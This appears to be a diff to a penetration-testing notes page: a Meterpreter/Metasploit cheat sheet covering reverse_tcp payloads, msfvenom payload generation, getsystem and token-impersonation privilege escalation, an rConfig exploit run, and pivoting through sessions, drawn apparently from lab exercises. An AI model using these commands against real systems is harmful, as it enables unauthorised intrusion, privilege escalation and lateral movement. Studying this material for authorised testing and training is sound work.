@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/meterpreter.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Meterpreter: choose the operation and read the result
+
+Commands and examples collected from your Meterpreter notes.
+
+### What the result establishes
+
+Identify the session's host, architecture, user and available capabilities before choosing a command.
+
+### Prerequisites and common failures
+
+A Meterpreter session is not automatically elevated; commands, extensions and transports have different prerequisites.
+
+### Example 1: Spawning TTY After Getting Shell
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+meterpreter > shell
+# Non-interactive shell, no prompt — need TTY:
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your Meterpreter notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=meterpreter) · [All tools](/index)
 
 ## Spawning TTY After Getting Shell
@@ -20,6 +46,13 @@ meterpreter > shell
 # Non-interactive shell, no prompt — need TTY:
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Spawning TTY After Getting Shell](/exploitation/shells-payloads-cheat-sheet#spawning-tty-after-getting-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -51,6 +84,13 @@ msf6 exploit(...) > check                    # (if supported) test vuln without 
 msf6 exploit(...) > run                       # or 'exploit'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Core workflow — search → use → set → run](/exploitation/metasploit-framework-cheat-sheet#core-workflow-—-search-→-use-→-set-→-run)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Mental model">
@@ -67,6 +107,13 @@ In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
 Need the internal net? → autoroute + socks_proxy → proxychains everything else
 Always: LHOST = your tun0, payload in venom must match the handler
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Mental model](/exploitation/metasploit-framework-cheat-sheet#mental-model)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -90,6 +137,13 @@ meterpreter > getsystem               # attempt local privesc to SYSTEM
 meterpreter > background              # park the session (back to msf prompt)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Meterpreter — the premium payload](/exploitation/metasploit-framework-cheat-sheet#meterpreter-—-the-premium-payload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Payloads — staged vs stageless (the / vs _)">
@@ -102,6 +156,13 @@ meterpreter > background              # park the session (back to msf prompt)
 windows/x64/meterpreter/reverse_tcp    ← staged   ( / before reverse_tcp)
 windows/x64/meterpreter_reverse_tcp    ← stageless ( _ )
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Payloads — staged vs stageless (the / vs _)](/exploitation/metasploit-framework-cheat-sheet#payloads-—-staged-vs-stageless-the-/-vs-_)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -121,6 +182,13 @@ meterpreter > run autoroute -s 172.16.5.0/24
 msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools through it
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Post-exploitation & pivoting](/exploitation/metasploit-framework-cheat-sheet#post-exploitation-&-pivoting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Sessions &amp; the multi/handler">
@@ -135,6 +203,13 @@ msf6 > sessions -i 1            # interact with session 1
 meterpreter > background        # or Ctrl-Z — park it
 msf6 > sessions -u 1            # upgrade a basic shell → Meterpreter
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Sessions & the multi/handler](/exploitation/metasploit-framework-cheat-sheet#sessions-&-the-multi/handler)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -159,6 +234,13 @@ msfvenom --list formats
 msfvenom --list payloads | grep windows
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2 · Metasploit routing (pivot through a session)">
@@ -176,6 +258,13 @@ route print                             # verify
 use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
 # then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — 2 · Metasploit routing (pivot through a session)](/modules/pivoting-tunneling-port-forwarding#2-·-metasploit-routing-pivot-through-a-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -201,6 +290,13 @@ msfvenom -l payloads
 # List formats
 msfvenom --list formats
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Common MSFvenom Commands](/exploitation/shells-payloads-cheat-sheet#common-msfvenom-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -241,6 +337,13 @@ meterpreter > upload <file>   # Upload file
 meterpreter > download <file> # Download file
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Metasploit Basic Workflow](/exploitation/shells-payloads-cheat-sheet#metasploit-basic-workflow)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="rConfig 3.9.6 Exploitation">
@@ -257,6 +360,13 @@ msf6 > exploit
 # → Meterpreter session as apache user
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — rConfig 3.9.6 Exploitation](/exploitation/shells-payloads-cheat-sheet#rconfig-3-9-6-exploitation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Meterpreter getsystem and alternatives">
@@ -272,6 +382,13 @@ incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
 psexec -s -i cmd.exe 
 python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Meterpreter getsystem and alternatives](/privesc/windows-privesc-checklist#meterpreter-getsystem-and-alternatives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -295,6 +412,13 @@ LPORT => 8080
 [*] Started reverse TCP handler on 172.16.5.225:8080
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Configuring & Starting MSF multi/handler](/active-directory/historical-vulnerability-labs#configuring-&-starting-msf-multi/handler)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Generating a DLL Payload">
@@ -312,6 +436,13 @@ No encoder specified, outputting raw payload
 Payload size: 510 bytes
 Final size of dll file: 8704 bytes
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Generating a DLL Payload](/active-directory/historical-vulnerability-labs#generating-a-dll-payload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -336,6 +467,24 @@ whoami
 nt authority\system
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Getting the SYSTEM Shell](/active-directory/historical-vulnerability-labs#getting-the-system-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+- [Metasploit Framework: Startup to Sessions](/exploitation/metasploit-framework-cheat-sheet)
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+- [Historical AD Vulnerability Labs](/active-directory/historical-vulnerability-labs)
+
+{/* VAULT_RELATED_END */}
